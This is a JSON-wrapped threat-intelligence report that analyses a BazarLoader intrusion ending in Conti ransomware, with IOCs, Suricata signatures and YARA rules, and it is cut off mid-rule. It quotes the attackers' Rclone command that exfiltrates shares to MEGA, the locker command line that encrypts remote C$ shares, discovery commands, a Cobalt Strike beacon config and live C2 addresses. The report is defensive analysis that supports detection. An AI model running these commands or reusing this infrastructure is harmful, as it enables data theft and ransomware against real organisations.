{
    "id": "c7a9cbb1-2445-4a96-b2fa-01805003b1f4",
    "created_at": "2023-01-12T15:06:40.646659Z",
    "updated_at": "2025-03-27T02:13:58.311781Z",
    "deleted_at": null,
    "sha1_hash": "8dbc05f125900d732bab37945c769a76760357f5",
    "title": "2021-11-29 - CONTInuing the Bazar Ransomware Story",
    "authors": "",
    "file_creation_date": "2022-05-28T18:04:33Z",
    "file_modification_date": "2022-05-28T18:04:33Z",
    "file_size": 1683367,
    "plain_text": "# CONTInuing the Bazar Ransomware Story\n\n**[thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/](https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)**\n\nNovember 29, 2021\n\n#### In this report we will discuss a case from early August where we witnessed threat actors utilizing BazarLoader and Cobalt Strike to accomplish their mission of encrypting systems with Conti ransomware.\n\n The normal list of discovery tools were used during this case such as AdFind, Net, Ping, PowerView, and Nltest. Rclone was used to exfiltrate company data to Mega and Process Hacker was used to dump LSASS. The threat actors executed a Conti batch file on a server which then encrypted most of the domain joined systems.\n\n## Case Summary\n\n#### In August, we witnessed an intrusion that started from a BazarLoader infection. A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source. Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.\n\n It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware. This case saw such a conclusion. There are some evident similarities in cases that involve Conti ransomware. Ransomware operators’ tooling and overall tasks performed tend to match across the cluster. When we look at our earlier Conti case, this becomes noticeable. This could be due to the widely\n\n\n-----\n\n#### circulated Conti manual that was leaked by an affiliate. In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.\n\n Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion. Straight away, they started gathering information to get the lay of the land using Net commands. Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.\n\n After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers. During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook. They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.\n\n Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke- ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.\n\n On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.\n\n On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.\n\n On the fifth day, they moved fast towards their final objective, which was Conti ransomware. Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application. Having GUI access, they attempted to use ProcessHacker to dump the LSASS process. After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.\n\n One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs). Most ransomware cases we see involve the threat actor executing code on the DCs.\n\n### Services\n\n#### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found here.\n\n The Cobalt Strike servers in this case were added to the Threat Feed on 5/20/21 and 08/03/21\n\n\n-----\n\n#### We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n\n-----\n\n#### Analysis and reporting completed by @Kostastsale, @pigerlin, and @_pete_0\n\n Reviewed by @TheDFIRReport\n\n## MITRE ATT&CK\n\n### Initial Access\n\n#### Thanks to @James_inthe_box for the sample!\n\n More fresh #bazaloader via password'd zips -> doc:https://t.co/fP7WiT4KHL\n\n dll drop hash:\n d21908a90b44f440d80bb728ffc0893746df936aefd7440fcba447bf8f523184\n\n c2: https://161.35.147[.]110/out/run/text/plain pic.twitter.com/aFZc9NznEi\n\n — James (@James_inthe_box) August 3, 2021\n\n\n-----\n\n#### As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload. The user is presented with the following:\n\n Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.\n\n A deeper inspection shows the Word 2003 XML formatting and the contained macro.\n\n\n-----\n\n#### Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user’s folder:\n\n Followed by the execution of the HTA:\n\n Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.\n\n\n-----\n\n#### The base64 encoded string can be decoded to:\n\n The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder “c:\\users\\public”, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.\n\n This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network. The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration. Two DLLs were loaded via RunDll32 using the Svchost process. The first was D574.dll:\n\n\n-----\n\n#### Followed by D8B3.dll:\n\n D8B3.dll injected into the Winlogon process (high integrity):\n\n In the case of D8B3.dll, the DLL was Go compiled. Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:\n\n Additionally, each DLL had no populated metadata relating to the DLL:\n\n The process hierarchy tree visualization below:\n\n\n-----\n\n#### This is very similar to the Bazarloader analysis by Brad Duncan on 11/08/2021.\n\n### Persistence\n\n#### We observed the AnyDesk application created under the folder c:\\users\\ <REDACTED>\\Videos’, an unusual location and suspicious location for process activity – this is a good detection opportunity where portable executables appear on non-standard file system locations.\n\n AnyDesk is a closed source remote desktop application that is available for several operating systems. It is free for private use. We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges. However, we did not observe many events of interest during these sessions.\n\n### Credential Access\n\n\n-----\n\n#### ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process. The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.\n\n### Discovery\n\n#### Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time. Examples included:\n```\ntasklist /s <REDACTED>\nnet group \"domain admins\" /dom\nnet localgroup \"administrator\"\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all time\nping\n\n While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP’s and seen right after this mistake.\n\n Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe. The example below using the time command:\n\n```\n\n-----\n\n#### Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.\n\n Discovery command invocation:\n\n\n-----\n\n#### AdFind was observed via a file write for the binary, but there was no evidence of execution.\n\n File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.\n\n The output file was created at c:\\ProgramData\\found_shares.txt. The use of this tool has been observed in other recent intrusions. PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe\n\n On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.\n\n\n-----\n\n#### After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.\n\n\n-----\n\n### Lateral Movement\n\n#### A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:\n\n Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:\n\n The Cobalt Strike beacon (143.dll) injected into the svchost process ‘svchost.exe -k UnistackSvcGroup -s CDPUserSvc’:\n\n Followed by a request to checkauj[.]com (82.117.252.143). Approximately 9 hours later, the attacker established an RDP session via the 143.dll. This was achieved very early in the intrusion, and we were able to correlate the activity:\n\n\n-----\n\n#### During this event, we believe that the attacker disclosed the remote workstation name ‘win- 344vu98d3ru’.\n\n\n-----\n\n### Command and Control\n\n#### The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.\n\n Bazar C2\n\n 64.227.65.60:443\n```\nJA3:72a589da586844d7f0818ce684948eea\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\n\n```\n\n-----\n\n```\nCertificate: [7f:d6:df:4d:5e:c4:d9:71:c0:46:8d:47:e5:81:75:57:d6:92:72:96 ]\nNot Before: 2021/08/03 07:37:28 UTC \nNot After: 2022/08/03 07:37:28 UTC \nIssuer Org: GG EST \nSubject Common: perdefue.fr \nSubject Org: GG EST \nPublic Algorithm: rsaEncryption\n\n#### 161.35.147.110:443\nJA3:72a589da586844d7f0818ce684948eea\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [21:ff:9f:e0:8a:dd:c3:ed:36:90:a0:e1:11:70:fe:c4:b3:42:f5:1a ]\nNot Before: 2021/08/03 07:37:30 UTC \nNot After: 2022/08/03 07:37:30 UTC \nIssuer Org: GG EST \nSubject Common: perdefue.fr \nSubject Org: GG EST \nPublic Algorithm: rsaEncryption\n\n 161.35.155.92:443\nJA3:72a589da586844d7f0818ce684948eea\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [42:7d:a4:48:5b:6b:2b:92:2c:07:9d:cc:59:14:2e:de:b1:e8:f5:bb ]\nNot Before: 2021/08/03 07:37:30 UTC \nNot After: 2022/08/03 07:37:30 UTC \nIssuer Org: GG EST \nSubject Common: perdefue.fr \nSubject Org: GG EST \nPublic Algorithm: rsaEncryption\n\n 64.227.69.92:443\nJA3:72a589da586844d7f0818ce684948eea\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [97:33:eb:80:85:ae:f0:0e:40:94:ac:d5:38:96:6a:e5:75:2b:49:8c ]\nNot Before: 2021/08/03 07:37:28 UTC \nNot After: 2022/08/03 07:37:28 UTC \nIssuer Org: GG EST \nSubject Common: perdefue.fr \nSubject Org: GG EST \nPublic Algorithm: rsaEncryption\n\n Cobalt Strike\n\n The first DLL [D574.dll] didn’t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.\n\n```\n\n-----\n\n#### D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.\n\n We observed that the DLL payload “D574.dll” had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.\n\n External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.\n\n https://tria.ge/210803-w15fxk72ns\n\n https://capesandbox.com/analysis/175977/\n\n D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.\n\n D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion. It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access. The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server. Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.\n\n five.azureedge.net 82.117.252.143:80\n\n checkauj.com 82.117.252.143:443\n\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [68:c5:fc:c0:4a:34:e4:8f:01:86:59:c1:da:40:78:00:00:20:a0:b0 ]\nNot Before: 2021/08/03 11:50:47 UTC \nNot After: 2021/11/01 11:50:45 UTC \nIssuer Org: Let's Encrypt \nSubject Common: checkauj.com [checkauj.com,www.checkauj.com ]\nPublic Algorithmrsa:Encryption\n\n#### Cobalt Strike Config\n\n 82.117.252.143 – checkauj.com\n\n```\n\n-----\n\n```\n{\n  \"BeaconType\": [\n    \"HTTP\"\n  ],\n  \"Port\": 80,\n  \"SleepTime\": 60000,\n  \"MaxGetSize\": 1403644,\n  \"Jitter\": 37,\n  \"C2Server\": \"checkauj.com,/jquery-3.3.1.min.js\",\n  \"HttpPostUri\": \"/jquery-3.3.2.min.js\",\n  \"Malleable_C2_Instructions\": [\n    \"Remove 1522 bytes from the end\",\n    \"Remove 84 bytes from the beginning\",\n    \"Remove 3931 bytes from the beginning\",\n    \"Base64 URL-safe decode\",\n    \"XOR mask w/ random key\"\n  ],\n  \"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"HttpGet_Verb\": \"GET\",\n  \"HttpPost_Verb\": \"POST\",\n  \"HttpPostChunk\": 0,\n  \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n  \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n  \"CryptoScheme\": 0,\n  \"Proxy_Behavior\": \"Use IE settings\",\n  \"Watermark\": 0,\n  \"bStageCleanup\": \"True\",\n  \"bCFGCaution\": \"False\",\n  \"KillDate\": 0,\n  \"bProcInject_StartRWX\": \"True\",\n  \"bProcInject_UseRWX\": \"False\",\n  \"bProcInject_MinAllocSize\": 17500,\n  \"ProcInject_PrependAppend_x86\": [\n    \"kJA=\",\n    \"Empty\"\n  ],\n  \"ProcInject_PrependAppend_x64\": [\n    \"kJA=\",\n    \"Empty\"\n  ],\n  \"ProcInject_Execute\": [\n    \"CreateThread\",\n    \"SetThreadContext\",\n    \"CreateRemoteThread\",\n    \"RtlCreateUserThread\"\n  ],\n  \"ProcInject_AllocationMethod\": \"VirtualAllocEx\",\n  \"bUsesCookies\": \"True\",\n  \"HostHeader\": \"\"}\n\n### Exfiltration\n\n```\n\n-----\n\n#### Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA. The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.\n```\nrclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing -auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M\n\n The use of RClone continues to be an effective tool for bulk data exfiltration. NCC Group has provided a detailed write-up of the Rclone application and detection methods.\n\n The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.\n\n### Impact\n\n#### On the fifth day, the threat actors moved to their final actions to encrypt the domain. They first pinged systems across the network via an interactive command shell. Iobit unlocker was also dropped during this phase but we did not see it used. After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.\n\n The locker.bat is a bespoke script designed to encrypt files across a number of hosts:\n\n```\n\n-----\n\n#### Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.\n\n The ransom was then launched via the backup server.\n\n To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.\n```\nC:\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m net -size 10 -nomutex -p \\\\TARGETHOST\\C$\n\n Here’s an overview of the execution:\n\n Analysis of the DLLs accompanying the EXE indicates Conti artifacts:\n\n```\n\n-----\n\n#### Once the encryption was completed, the following ransomware note dropped in all affected directories as ‘readme.txt’\n\n The content of these text files:\n\n Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts – likely to validate and assess that the locker encryption was successful:\n\n\n-----\n\n## IOCs\n\n### Network\n```\nBazarLoader\n64.227.69.92|443 \n161.35.155.92|443 \n161.35.147.110|443 \n64.227.65.60|443\nLoader download\nmillscruelg.com\n45.95.11.133|80\nCobalt Strike\nvolga.azureedge.net\nfive.azureedge.net\ncheckauj.com\n82.117.252.143|443\n82.117.252.143|80\n\n Files\n\n```\n\n-----\n\n```\ndecree 08.03.2021.doc\nf6f72e3d91f7b53dd75e347889a793da\n5d4f020115a483e9e5aa9778c038466f9014c90c\n14bccfecaaec8353e3e8f090ec1d3e9c87eb8ceb2a7abedfc47c3c980da8ad71\ncompareForFor.hta\n193b84d45dd371c6e4a501333d37349b\n742ed8d0202aafba1c162537087a8a131cb85cde\nfb38061bf601001c45aafe8d0c5feaa22c607d2ff79cfb841788519ca55a17b4\nD8B3.dll\n4ba6791f2293a8bc2dfa537015829b3c\nd4f5cc55b6fa25f9a45ba7e968438b97e33aefbc\n4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6\nD574.dll\n663c8d0fe8b770b50792d10f6c07a652\nd0361fbcebe59205b2ea6a31041c89464a5e61b6\n1872bf6c974e9b11040851f7d30e5326afdc8b13802891c222af4368a14f829c\n143.dll\nab3a744545a12ba2f6789e94b789666a\n1d5f8d283ed3f6019954aa480182c9913ee49735\n6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610\nProcessHacker.exe\n68f9b52895f4d34e74112f3129b3b00d\nc5e2018bf7c0f314fed4fd7fe7e69fa2e648359e\nd4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f\nlocker.bat\n84361813423910294079d0bc5b6daba2\nc0b28fd2d5b62d5129225e8c45d368bc9e9fd415\n1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe\n7f112bfa16a6bd344aaed28abf606780\neaa792a1c9f1d277af3d88bd9ea17a33275308f3\n9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64.dll\n2c313c5b532c905eb8f1748a0d656ff9\n70725329e4c14b39d49db349f3c84e055c111f2d\n31656dcea4da01879e80dff59a1af60ca09c951fe5fc7e291be611c4eadd932a\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86.dll\n26bd89afd5c1ba9803422d33185cef89\nc99f0fa8d5fbffe5288aaff84dbe980c412ba34e\n01a9549c015cfcbff4a830cea7df6386dc5474fd433f15a6944b834551a2b4c9\nAnyDesk.exe\ne6c3ab2ee9a613efdf995043b140fd8e\n33738cf695a6ac03675fe925d62ecb529ac73d03\n8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7\nunlocker.exe\n5840aa36b70b7c03c25e5e1266c5835b\nea031940b2120551a6abbe125eb0536b9e4f14c8\n09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53\nrclone.exe\n9066cfcf809bb19091509a4d0f15f092\nf88a948b0fd137d4b14cf5aec0c08066cb07e08d\n9b5d1f6a94ce122671a5956b2016e879428c74964174739b68397b6384f6ee8b\n\n### Suricata\n\n```\n\n-----\n\n```\nET TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile Response\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) \nET USER_AGENTS AnyDesk Remote Desktop Software User-Agent \nET POLICY HTTP POST to MEGA Userstorage\n\n### Sigma\n\n Yara\n\n```\n\n-----\n\n```\n/\n  YARA Rule Set\n  Author: TheDFIRReport\n  Date: 2021-11-29\n  Identifier: 5794\n  */\n/* Rule Set ----------------------------------------------------------------- */\nrule mal_host2_143 {\n  meta:\n   description = \"mal - file 143.dll\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n   hash1 = \"6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610\"\n  strings:\n   $x1 = \"object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:\ng: g=runtime: addr = runtime: base = runtime: gp: gp=\" ascii\n   $x2 = \"slice bounds out of range [:%x] with length %ystopTheWorld: not stopped\n(status != _Pgcstop)sysGrow bounds not aligned to palloc\" ascii\n   $x3 = \" to unallocated\nspanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGe\n ascii\n   $x4 = \"Go pointer stored into non-Go memoryUnable to determine system\ndirectoryaccessing a corrupted shared libraryruntime: VirtualQuer\" ascii\n   $x5 =\n\"GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWS\n mismatchadvapi32\" ascii\n   $x6 = \"lock: lock countslice bounds out of rangesocket type not\nsupportedstartm: p has runnable gsstoplockedm: not runnableunexpected f\" ascii\n   $x7 = \"unknown pcws2_32.dll of size  (targetpc= KiB work, freeindex=\ngcwaiting= heap_live= idleprocs= in status mallocing= ms clock\" ascii\n   $x8 = \"file descriptor in bad statefindrunnable: netpoll with pfound pointer to\nfree objectgcBgMarkWorker: mode not setgcstopm: negativ\" ascii\n   $x9 = \".lib section in a.out corruptedbad write barrier buffer boundscall from\nwithin the Go runtimecannot assign requested addresscasg\" ascii\n   $x10 = \"Ptrmask.lockentersyscallblockexec format errorg already\nscannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf\" ascii\n   $x11 = \"entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid\nslotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe\" ascii\n   $x12 = \"ollectionidentifier removedindex out of rangeinput/output errormultihop\nattemptedno child processesno locks availableoperation c\" ascii\n   $s13 = \"y failed; errno=runtime: bad notifyList size - sync=runtime: invalid\npc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt\" ascii\n   $s14 = \"ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB\ntotal, [recovered] allocCount found at *( gcscandone m->gs\" ascii\n   $s15 = \".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64\nfailedchan receivedumping heapend tracegc\" fullword ascii\n   $s16 = \"ked to\nthreadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAc\n specific errorSetFile\" ascii\n   $s17 = \"mstartbad sequence numberdevice not a streamdirectory not emptydisk\nquota exceededdodeltimer: wrong Pfile already closedfile alr\" ascii\n   $s18 = \"structure needs cleaning bytes failed with errno= to unused region of\nspanGODEBUG: can not enable \\\"GetQueuedCompletionStatus_cg\" ascii\n\n```\n\n-----\n\n```\n   $s19 garbage collection scangcDrain phase incorrectindex out of range\n[%x]interrupted system callinvalid m->lockedInt = left over mar\" ascii\n   $s20 =\n\"tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad\npbad file descriptorbad notifyList sizebad \" ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 4000KB and\n   1 of ($x*) and all of them\n}\nrule mal_host1_D8B3 {\n  meta:\n   description = \"mal - file D8B3.dll\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n   hash1 = \"4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6\"\n  strings:\n   $x1 = \"object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:\ng: g=runtime: addr = runtime: base = runtime: gp: gp=\" ascii\n   $x2 = \"slice bounds out of range [:%x] with length %ystopTheWorld: not stopped\n(status != _Pgcstop)sysGrow bounds not aligned to palloc\" ascii\n   $x3 = \" to unallocated\nspanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGe\n ascii\n   $x4 = \"Go pointer stored into non-Go memoryUnable to determine system\ndirectoryaccessing a corrupted shared libraryruntime: VirtualQuer\" ascii\n   $x5 =\n\"GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWS\n mismatchadvapi32\" ascii\n   $x6 = \"lock: lock countslice bounds out of rangesocket type not\nsupportedstartm: p has runnable gsstoplockedm: not runnableunexpected f\" ascii\n   $x7 = \"unknown pcws2_32.dll of size  (targetpc= KiB work, freeindex=\ngcwaiting= heap_live= idleprocs= in status mallocing= ms clock\" ascii\n   $x8 = \"file descriptor in bad statefindrunnable: netpoll with pfound pointer to\nfree objectgcBgMarkWorker: mode not setgcstopm: negativ\" ascii\n   $x9 = \".lib section in a.out corruptedbad write barrier buffer boundscall from\nwithin the Go runtimecannot assign requested addresscasg\" ascii\n   $x10 = \"Ptrmask.lockentersyscallblockexec format errorg already\nscannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf\" ascii\n   $x11 = \"entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid\nslotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe\" ascii\n   $x12 = \"ollectionidentifier removedindex out of rangeinput/output errormultihop\nattemptedno child processesno locks availableoperation c\" ascii\n   $s13 = \"y failed; errno=runtime: bad notifyList size - sync=runtime: invalid\npc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt\" ascii\n   $s14 = \"ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB\ntotal, [recovered] allocCount found at *( gcscandone m->gs\" ascii\n   $s15 = \".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64\nfailedchan receivedumping heapend tracegc\" fullword ascii\n   $s16 = \"ked to\nthreadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAc\n specific errorSetFile\" ascii\n   $s17 = \"mstartbad sequence numberdevice not a streamdirectory not emptydisk\nquota exceededdodeltimer: wrong Pfile already closedfile alr\" ascii\n   $s18 = \"structure needs cleaning bytes failed with errno= to unused region of\n\n```\n\n-----\n\n```\nspanGODEBUG: can not enable \\ GetQueuedCompletionStatus_cg ascii\n   $s19 = \"garbage collection scangcDrain phase incorrectindex out of range\n[%x]interrupted system callinvalid m->lockedInt = left over mar\" ascii\n   $s20 =\n\"tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad\npbad file descriptorbad notifyList sizebad \" ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 4000KB and\n   1 of ($x*) and all of them\n}\nrule mal_host2_AnyDesk {\n  meta:\n   description = \"mal - file AnyDesk.exe\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n   hash1 = \"8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7\"\n  strings:\n   $x1 = \"<assemblyIdentity type=\\\"win32\\\" name=\\\"Microsoft.Windows.CommonControls\\\" version=\\\"6.0.0.0\\\" processorArchitecture=\\\"x86\\\" pu\" ascii\n   $x2 = \"C:\\\\Buildbot\\\\ad-windows-32\\\\build\\\\release\\\\app32\\\\win_loader\\\\AnyDesk.pdb\" fullword ascii\n   $s3 = \"<assemblyIdentity type=\\\"win32\\\" name=\\\"Microsoft.Windows.CommonControls\\\" version=\\\"6.0.0.0\\\" processorArchitecture=\\\"x86\\\" pu\" ascii\n   $s4 = \"<assemblyIdentity version=\\\"6.3.2.0\\\" processorArchitecture=\\\"x86\\\"\nname=\\\"AnyDesk.AnyDesk.AnyDesk\\\" type=\\\"win32\\\" />\" fullword ascii\n   $s5 = \"4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0O\" fullword ascii\n   $s6 = \"(Symantec SHA256 TimeStamping Signer - G3\" fullword ascii\n   $s7 = \"(Symantec SHA256 TimeStamping Signer - G30\" fullword ascii\n   $s8 = \"http://ocsp.digicert.com0N\" fullword ascii\n   $s9 = \"http://www.digicert.com/CPS0\" fullword ascii\n   $s10 = \"Bhttp://cacerts.digicert.com/DigiCertSHA2AssuredIDCodeSigningCA.crt0\"\nfullword ascii\n   $s11 = \"<description>AnyDesk screen sharing and remote control software.\n</description>\" fullword ascii\n   $s12 = \"/http://crl3.digicert.com/sha2-assured-cs-g1.crl05\" fullword ascii\n   $s13 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii\n   $s14 = \"%jgmRhZl%\" fullword ascii\n   $s15 = \"5ZW:\\\"Wfh\" fullword ascii\n   $s16 = \"5HRe:\\\\\" fullword ascii\n   $s17 = \"ysN.JTf\" fullword ascii\n   $s18 = \"Z72.irZ\" fullword ascii\n   $s19 = \"Ve:\\\\-Sj7\" fullword ascii\n   $s20 = \"ekX.cFm\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 11000KB and\n   1 of ($x*) and 4 of them\n}\nrule ProcessHacker {\n  meta:\n   description = \"mal - file ProcessHacker.exe\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n\n```\n\n-----\n\n```\n   hash1 d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f \n  strings:\n   $x1 = \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution\nOptions\\\\taskmgr.exe\" fullword wide\n   $x2 = \"D:\\\\Projects\\\\processhacker2\\\\bin\\\\Release32\\\\ProcessHacker.pdb\"\nfullword ascii\n   $x3 = \"ProcessHacker.exe\" fullword wide\n   $x4 = \"kprocesshacker.sys\" fullword wide\n   $x5 = \"ntdll.dll!NtDelayExecution\" fullword wide\n   $x6 = \"ntdll.dll!ZwDelayExecution\" fullword wide\n   $s7 = \"PhInjectDllProcess\" fullword ascii\n   $s8 = \"[email protected]\" fullword ascii\n   $s9 = \"logonui.exe\" fullword wide\n   $s10 = \"Executable files (*.exe;*.dll;*.ocx;*.sys;*.scr;*.cpl)\" fullword wide\n   $s11 = \"\\\\x86\\\\ProcessHacker.exe\" fullword wide\n   $s12 = \"user32.dll!NtUserGetMessage\" fullword wide\n   $s13 = \"ntdll.dll!NtWaitForKeyedEvent\" fullword wide\n   $s14 = \"ntdll.dll!ZwWaitForKeyedEvent\" fullword wide\n   $s15 = \"ntdll.dll!NtReleaseKeyedEvent\" fullword wide\n   $s16 = \"ntdll.dll!ZwReleaseKeyedEvent\" fullword wide\n   $s17 = 